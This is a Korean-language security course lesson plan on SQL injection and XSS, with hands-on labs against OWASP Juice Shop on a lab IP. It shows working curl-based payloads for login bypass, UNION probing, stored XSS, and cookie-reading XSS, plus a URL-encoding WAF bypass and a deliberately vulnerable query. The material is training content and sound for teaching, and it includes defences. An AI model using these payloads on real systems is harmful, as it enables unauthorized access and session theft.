# Week 03: 웹 공격 기초 — SQL Injection, XSS

## 학습 목표
- SQL Injection의 원리를 이해하고 기본 공격을 수행할 수 있다
- XSS(Cross-Site Scripting)의 유형을 구분하고 실습할 수 있다
- 웹 애플리케이션 취약점이 발생하는 근본 원인을 설명할 수 있다
- 방어자 관점에서 입력값 검증과 WAF의 역할을 이해한다

## 선수 지식
- HTTP 요청/응답 구조 (GET, POST, 헤더, 쿠키)
- HTML/JavaScript 기본 문법
- SQL SELECT/WHERE 문법 기초

## 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:30 | SQL Injection 이론 | 강의 |
| 0:30-0:50 | XSS 이론 | 강의 |
| 0:50-1:00 | 휴식 | - |
| 1:00-1:40 | SQL Injection 실습 (JuiceShop) | 실습 |
| 1:40-2:20 | XSS 실습 (JuiceShop) | 실습 |
| 2:20-2:30 | 휴식 | - |
| 2:30-3:10 | WAF 우회 및 방어 기법 실습 | 실습 |
| 3:10-3:40 | 토론 + 퀴즈 | 토론/퀴즈 |

---

# Part 1: SQL Injection 이론 (30분)

## 1.1 SQL Injection이란?

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 직접 삽입될 때 발생하는 취약점이다. CWE-89에 해당하며, OWASP Top 10에서 지속적으로 상위에 랭크된다.

### 취약한 코드 예시

```python
# 취약한 코드 (절대 이렇게 작성하지 말 것)
query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"
```

공격자가 email 필드에 `' OR 1=1--`를 입력하면:

```sql
SELECT * FROM users WHERE email='' OR 1=1--' AND password=''
```

`OR 1=1`이 항상 참이므로 모든 사용자 레코드가 반환된다.

### SQLi 유형

| 유형 | 설명 | 난이도 |
|------|------|--------|
| **In-band (Classic)** | 쿼리 결과가 직접 표시됨 | 낮음 |
| **Error-based** | 에러 메시지로 정보 유출 | 낮음 |
| **Union-based** | UNION으로 추가 데이터 추출 | 중간 |
| **Blind (Boolean)** | 참/거짓 응답 차이로 추론 | 높음 |
| **Time-based Blind** | 응답 시간 차이로 추론 | 높음 |

## 1.2 XSS(Cross-Site Scripting) 이론

XSS는 악성 스크립트가 웹 페이지에 삽입되어 다른 사용자의 브라우저에서 실행되는 취약점이다. CWE-79에 해당한다.

### XSS 유형

| 유형 | 저장 여부 | 실행 위치 | 예시 |
|------|----------|----------|------|
| **Reflected** | 저장 안 됨 | 서버 응답에 반사 | 검색어에 스크립트 삽입 |
| **Stored** | 서버에 저장 | 페이지 로드 시 실행 | 게시판 댓글에 스크립트 |
| **DOM-based** | 저장 안 됨 | 클라이언트 측 처리 | JavaScript가 URL 파라미터 직접 사용 |

---

# Part 2: 실습 가이드

## 실습 2.1: SQL Injection 기초 (JuiceShop)

> **목적**: JuiceShop 로그인 페이지에서 SQL Injection을 실습한다
> **배우는 것**: 인증 우회, 데이터 추출 기법

```bash
# JuiceShop 접속 확인
curl -s http://10.20.30.80:3000 | head -5

# 로그인 페이지 인증 우회 시도
curl -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}'

# 검색 기능에서 SQLi 테스트
curl "http://10.20.30.80:3000/rest/products/search?q=test'\''--"

# UNION 기반 데이터 추출 (컬럼 수 확인)
curl "http://10.20.30.80:3000/rest/products/search?q=test'\'' UNION SELECT 1,2,3,4,5,6,7,8,9--"
```

> **결과 해석**: 인증 우회가 성공하면 관리자 토큰이 반환된다. UNION 공격이 성공하면 임의의 데이터를 조회할 수 있다.
> **실전 활용**: 공방전에서 웹 서비스가 있다면 로그인 페이지와 검색 기능을 우선 점검한다.

## 실습 2.2: XSS 공격 실습

> **목적**: Reflected XSS와 Stored XSS를 실습한다
> **배우는 것**: 스크립트 삽입 기법과 쿠키 탈취 원리

```bash
# Reflected XSS 테스트 (브라우저에서 실행)
# URL: http://10.20.30.80:3000/#/search?q=<script>alert('XSS')</script>

# iframe 삽입 테스트
# http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert('XSS')">

# DOM-based XSS 페이로드
# http://10.20.30.80:3000/#/search?q=<img src=x onerror=alert(document.cookie)>

# Stored XSS: 상품 리뷰에 스크립트 삽입
curl -X PUT http://10.20.30.80:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"message":"<script>alert(1)</script>","author":"test"}'
```

> **결과 해석**: alert 창이 뜨면 XSS가 성공한 것이다. document.cookie를 추출할 수 있다면 세션 하이재킹이 가능하다.

## 실습 2.3: WAF 탐지 및 방어 확인

> **목적**: BunkerWeb WAF가 공격을 어떻게 차단하는지 확인한다
> **배우는 것**: WAF 동작 원리와 로그 분석

```bash
# WAF가 활성화된 상태에서 SQLi 시도
curl -v "http://10.20.30.80/search?q=' OR 1=1--"

# WAF 차단 로그 확인 (web 서버)
tail -20 /var/log/bunkerweb/error.log

# WAF 우회 시도 (인코딩)
curl "http://10.20.30.80/search?q=%27%20OR%201%3D1--"
```

> **결과 해석**: WAF가 활성화되면 403 Forbidden 또는 차단 페이지가 반환된다. 로그에서 차단 사유를 확인할 수 있다.

---

# Part 3: 심화 학습

## 3.1 안전한 코딩 패턴

```python
# 안전: 파라미터화된 쿼리
cursor.execute("SELECT * FROM users WHERE email=%s AND password=%s", (email, password))

# 안전: ORM 사용
user = session.query(User).filter_by(email=email, password=password).first()
```

## 3.2 방어 체계

- **입력값 검증**: 화이트리스트 기반 필터링
- **출력 인코딩**: HTML 엔티티 변환
- **CSP 헤더**: Content-Security-Policy로 인라인 스크립트 차단
- **WAF**: 패턴 기반 공격 차단

---

## 검증 체크리스트
- [ ] JuiceShop에서 SQL Injection으로 인증을 우회했는가
- [ ] Reflected XSS 페이로드를 성공적으로 실행했는가
- [ ] WAF가 공격을 차단하는 과정을 로그에서 확인했는가
- [ ] 파라미터화된 쿼리와 취약한 쿼리의 차이를 설명할 수 있는가

## 자가 점검 퀴즈
1. SQL Injection에서 `--` (더블 대시)의 역할은 무엇인가?
2. Stored XSS가 Reflected XSS보다 위험한 이유를 설명하라.
3. UNION 기반 SQLi에서 컬럼 수를 먼저 확인해야 하는 이유는?
4. Content-Security-Policy 헤더가 XSS를 방어하는 원리를 설명하라.
5. Blind SQL Injection에서 데이터를 추출하는 방법을 설명하라.
